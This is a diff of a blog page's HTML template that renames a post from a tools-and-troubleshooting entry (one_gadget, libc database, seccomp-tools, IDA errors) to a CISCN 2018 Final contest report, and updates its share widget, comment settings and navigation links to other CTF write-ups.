-            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#工具使用"><span class="toc-number">1.</span> <span class="toc-text">工具使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#one-gadget"><span class="toc-number">1.1.</span> <span class="toc-text">one_gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安装方法"><span class="toc-number">1.1.1.</span> <span class="toc-text">安装方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用方法"><span class="toc-number">1.1.2.</span> <span class="toc-text">使用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#libc-database"><span class="toc-number">1.2.</span> <span class="toc-text">libc database</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安装方法-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">安装方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用方法-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">使用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#seccomp-tools"><span class="toc-number">1.3.</span> <span class="toc-text">seccomp-tools</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#安装方法-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">安装方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用方法-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">使用方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#问题解决"><span class="toc-number">2.</span> <span class="toc-text">问题解决</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ida-“sp-analysis-failed”-错误"><span class="toc-number">2.1.</span> <span class="toc-text">ida “sp-analysis failed” 错误</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#问题描述"><span class="toc-number">2.1.1.</span> <span class="toc-text">问题描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解决方法"><span class="toc-number">2.1.2.</span> <span class="toc-text">解决方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gem-“ERROR-Failed-to-build-gem-native-extension-”问题"><span class="toc-number">2.2.</span> <span class="toc-text">gem “ERROR: Failed to build gem native extension.”问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#问题描述-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">问题描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解决方法-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">解决方法</span></a></li></ol></li></ol></li></ol>
+            
         
     </div>
     <style>
@@ -476,7 +451,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"问题解决及工具使用　| p4nda's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"CISCN 2018 Final赛记　| p4nda's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -495,8 +470,8 @@
     <div id="disqus_thread"></div>
     <script>
         var disqus_config = function(){
-            this.page.url = 'http://p4nda.top/2018/03/03/question/';
-            this.page.identifier = '2018/03/03/question/';
+            this.page.url = 'http://p4nda.top/2018/07/27/CISCN-Final/';
+            this.page.identifier = '2018/07/27/CISCN-Final/';
         };
         var loadComment = function(){
             var d = document, s = d.createElement('script');
@@ -518,15 +493,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/03/06/hgame/" title="上一篇: HGAME 2018 PWN题记录">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2018/02/05/hitctf/" title="下一篇: HITCTF 2018 PWN 题记录">
+            <a href="/2018/07/20/0ctf-baby/" title="下一篇: 【kernel pwn】0ctf 2018 final baby题解">
                 <i class="fa fa-angle-right"></i>
             </a>
         
